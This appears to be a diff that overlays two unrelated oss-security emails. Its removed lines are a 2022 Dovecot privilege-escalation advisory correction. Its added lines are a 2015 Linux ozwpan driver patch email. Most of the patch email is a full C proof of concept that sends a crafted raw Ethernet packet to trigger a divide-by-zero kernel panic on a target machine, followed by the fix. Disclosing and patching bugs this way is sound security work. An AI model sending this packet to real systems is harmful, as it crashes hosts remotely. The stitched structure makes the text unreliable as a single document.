@@ -1,4 +1,9 @@
-Received: (qmail 17502 invoked by uid 550); 8 Jul 2022 08:16:17 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4357" "Wednesday" "13" "May" "2015" "20:58:19" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1431543500-4847-4-git-send-email-Jason@zx2c4.com>" "174" "[oss-security] [PATCH 3/4] ozwpan: divide-by-zero leading to panic" nil nil nil "5" "2015051318:58:19" "[oss-security] [PATCH 3/4] ozwpan: divide-by-zero leading to panic" (number mark "        Jason@zx2c4. May 13  174/4357  " thread-indent "\"[oss-security] [PATCH 3/4] ozwpan: divide-by-zero leading to panic\"\n") "<1431543500-4847-1-git-send-email-Jason@zx2c4.com>" ("<20150513185322.GA4029@kroah.com>" "<1431543500-4847-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 21773 invoked by uid 550); 13 May 2015 18:59:20 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,57 +11,202 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 18066 invoked from network); 13 May 2015 18:58:55 -0000
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
+	:subject:date:message-id:in-reply-to:references; s=mail; bh=+kWb
+	wwChoH/eFz4bXWC6JJxM5y8=; b=HMfgvh1LC8mccSwBNjS/9t6m6S0Mte4unFS/
+	RSLYCcjUr8yjW3BJXn6G18dlYV0U0vij+xMZWwoUd4etCaEh+zpMnFFJ4owEGNOZ
+	dz8nL+5h0rEHRonPOPwWqbJCyrFQeC/9Xo1/GT/Zjrpaqu3QNQ18v/Ip1Qepa+XY
+	WdNevs99W9VsiteojGTNyMsrYiDBgJ9rHraCTYhE/J6W4xqAHBnicjNC30h8snb6
+	JZSYrVI5UfL0DkyJrbY7Zx3+HF5L4HaO43vqpVke5EGZAybqfjcEjqyfE7G4x0CE
+	0PqgnXYc7WxdF1pGfoJjO7wLYHVj4xByvaI02jNxSnpLtO09kw==
+Message-Id: <1431543500-4847-4-git-send-email-Jason@zx2c4.com>
+X-Mailer: git-send-email 2.3.6
+In-Reply-To: <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
+References: <20150513185322.GA4029@kroah.com>
+ <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
+Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
+Date: Wed, 13 May 2015 20:58:19 +0200
+From: "Jason A. Donenfeld" <Jason@zx2c4.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 9287 invoked from network); 8 Jul 2022 07:21:09 -0000
-Date: Fri, 8 Jul 2022 10:20:57 +0300 (EEST)
-From: Aki Tuomi <aki.tuomi@dovecot.fi>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Message-ID: <857511092.5199.1657264857437@appsuite-dev.open-xchange.com>
-In-Reply-To: <185548807.26514.1657115687920@appsuite-dev.open-xchange.com>
-References: <185548807.26514.1657115687920@appsuite-dev.open-xchange.com>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
-X-Priority: 3
-Importance: Normal
-X-Mailer: Open-Xchange Mailer v7.10.6-Rev15
-X-Originating-Client: open-xchange-appsuite
-Subject: [oss-security] Re: CVE-2022-30550: Privilege escalation possible in dovecot when
- similar master and non-master passdbs are used
+Subject: [oss-security] [PATCH 3/4] ozwpan: divide-by-zero leading to panic
+To: oss-security <oss-security@lists.openwall.com>,
+	linux-kernel@vger.kernel.org,
+	Shigekatsu Tateno <shigekatsu.tateno@atmel.com>,
+	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
+	devel@driverdev.osuosl.org
 
+A network supplied parameter was not checked before division, leading to
+a divide-by-zero. Since this happens in the softirq path, it leads to a
+crash. A PoC follows below, which requires the ozprotocol.h file from
+this module.
 
-> On 06/07/2022 16:54 EEST Aki Tuomi <aki.tuomi@dovecot.fi> wrote:
-> 
->  
-> Affected product: Dovecot IMAP Server 
-> Internal reference: DOV-5320
-> Vulnerability type: Improper Access Control (CWE-284) 
-> Vulnerable version: 2.2
-> Vulnerable component: submission 
-> Report confidence: Confirmed 
-> Solution status: Fixed in main
-> Researcher credits: Julian Brook (julezman)
-> Vendor notification: 2022-05-06 
-> CVE reference: CVE-2022-30550
-> CVSS: 6.8 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N) 
-> 
-> Vulnerability Details: 
-> When two passdb configuration entries exist in Dovecot configuration, which have the same driver and args settings, the incorrect username_filter and mechanism settings can be applied to passdb definitions. These incorrectly applied settings can lead to an unintended security configuration and can permit privilege escalation with certain configurations involving master user authentication.
-> 
-> Dovecot documentation does not advise against the use of passdb definitions which have the same driver and args settings. One such configuration would be where an administrator wishes to use the same pam configuration or passwd file for both normal and master users but use the username_filter setting to restrict which of the users is able to be a master user.
-> 
-> Risk: 
-> If same passwd file or PAM is used for both normal and master users, it is possible for attacker to become master user.
-> 
-> Workaround:
-> Always authenticate master users from different source than regular users, e.g. using a separate passwd file. Alternatively, you can use global ACLs to ensure that only legimate master users have priviledged access.
-> 
-> Fix:
-> This has been fixed in main branch. See https://github.com/dovecot/core/compare/7bad6a24%5E..a1022072.patch
+=-=-=-=-=-=
 
-Hi all, unfortunately two mistakes crept into this notification. Apologies for that.
+ #include <arpa/inet.h>
+ #include <linux/if_packet.h>
+ #include <net/if.h>
+ #include <netinet/ether.h>
+ #include <stdio.h>
+ #include <string.h>
+ #include <stdlib.h>
+ #include <endian.h>
+ #include <sys/ioctl.h>
+ #include <sys/socket.h>
 
-The correct component for this is "auth", and the affected version should have been "2.2 and newer".
+ #define u8 uint8_t
+ #define u16 uint16_t
+ #define u32 uint32_t
+ #define __packed __attribute__((__packed__))
+ #include "ozprotocol.h"
 
-Regards,
-Aki Tuomi
+static int hex2num(char c)
+{
+	if (c >= '0' && c <= '9')
+		return c - '0';
+	if (c >= 'a' && c <= 'f')
+		return c - 'a' + 10;
+	if (c >= 'A' && c <= 'F')
+		return c - 'A' + 10;
+	return -1;
+}
+static int hwaddr_aton(const char *txt, uint8_t *addr)
+{
+	int i;
+	for (i = 0; i < 6; i++) {
+		int a, b;
+		a = hex2num(*txt++);
+		if (a < 0)
+			return -1;
+		b = hex2num(*txt++);
+		if (b < 0)
+			return -1;
+		*addr++ = (a << 4) | b;
+		if (i < 5 && *txt++ != ':')
+			return -1;
+	}
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	if (argc < 3) {
+		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
+		return 1;
+	}
+
+	uint8_t dest_mac[6];
+	if (hwaddr_aton(argv[2], dest_mac)) {
+		fprintf(stderr, "Invalid mac address.\n");
+		return 1;
+	}
+
+	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+	if (sockfd < 0) {
+		perror("socket");
+		return 1;
+	}
+
+	struct ifreq if_idx;
+	int interface_index;
+	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
+	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
+		perror("SIOCGIFINDEX");
+		return 1;
+	}
+	interface_index = if_idx.ifr_ifindex;
+	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
+		perror("SIOCGIFHWADDR");
+		return 1;
+	}
+	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+
+	struct {
+		struct ether_header ether_header;
+		struct oz_hdr oz_hdr;
+		struct oz_elt oz_elt;
+		struct oz_elt_connect_req oz_elt_connect_req;
+		struct oz_elt oz_elt2;
+		struct oz_multiple_fixed oz_multiple_fixed;
+	} __packed packet = {
+		.ether_header = {
+			.ether_type = htons(OZ_ETHERTYPE),
+			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+		},
+		.oz_hdr = {
+			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+			.last_pkt_num = 0,
+			.pkt_num = htole32(0)
+		},
+		.oz_elt = {
+			.type = OZ_ELT_CONNECT_REQ,
+			.length = sizeof(struct oz_elt_connect_req)
+		},
+		.oz_elt_connect_req = {
+			.mode = 0,
+			.resv1 = {0},
+			.pd_info = 0,
+			.session_id = 0,
+			.presleep = 0,
+			.ms_isoc_latency = 0,
+			.host_vendor = 0,
+			.keep_alive = 0,
+			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
+			.max_len_div16 = 0,
+			.ms_per_isoc = 0,
+			.up_audio_buf = 0,
+			.ms_per_elt = 0
+		},
+		.oz_elt2 = {
+			.type = OZ_ELT_APP_DATA,
+			.length = sizeof(struct oz_multiple_fixed)
+		},
+		.oz_multiple_fixed = {
+			.app_id = OZ_APPID_USB,
+			.elt_seq_num = 0,
+			.type = OZ_USB_ENDPOINT_DATA,
+			.endpoint = 0,
+			.format = OZ_DATA_F_MULTIPLE_FIXED,
+			.unit_size = 0,
+			.data = {0}
+		}
+	};
+
+	struct sockaddr_ll socket_address = {
+		.sll_ifindex = interface_index,
+		.sll_halen = ETH_ALEN,
+		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+	};
+
+	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+		perror("sendto");
+		return 1;
+	}
+	return 0;
+}
+
+Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
+---
+ drivers/staging/ozwpan/ozusbsvc1.c | 5 ++++-
+ 1 file changed, 4 insertions(+), 1 deletion(-)
+
+diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
+index cd6c63e..2e67956 100644
+--- a/drivers/staging/ozwpan/ozusbsvc1.c
++++ b/drivers/staging/ozwpan/ozusbsvc1.c
+@@ -326,7 +326,10 @@ static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,
+ 			struct oz_multiple_fixed *body =
+ 				(struct oz_multiple_fixed *)data_hdr;
+ 			u8 *data = body->data;
+-			int n = (len - sizeof(struct oz_multiple_fixed)+1)
++			int n;
++			if (!body->unit_size)
++				break;
++			n = (len - sizeof(struct oz_multiple_fixed)+1)
+ 				/ body->unit_size;
+ 			while (n--) {
+ 				oz_hcd_data_ind(usb_ctx->hport, body->endpoint,
+-- 
+2.3.6
+
